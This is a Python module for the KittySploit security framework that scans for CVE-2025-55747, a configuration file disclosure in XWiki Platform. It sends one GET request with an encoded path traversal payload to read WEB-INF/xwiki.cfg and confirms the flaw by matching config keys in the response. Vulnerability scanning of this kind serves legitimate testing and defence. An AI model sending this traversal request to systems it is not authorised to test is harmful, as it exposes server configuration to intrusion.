#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki Platform - Information Disclosure Detection',
        'description': 'XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. In versions 6.1-milestone-2 through 16.10.6, configuration files are accessible through the webjars API.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xwiki', 'lfi', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://jira.xwiki.org/browse/XWIKI-19350', 'https://nvd.nist.gov/vuln/detail/CVE-2025-55747'],
        'cve': 'CVE-2025-55747',
    }

    def run(self):
        r = self.http_request(method="GET", path='/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('xwiki.editcomment=', 'xwiki.plugins=', 'xwiki.encoding=',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="XWiki Platform - Information Disclosure detected",
                path='/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg',
            )
            return True
        return False

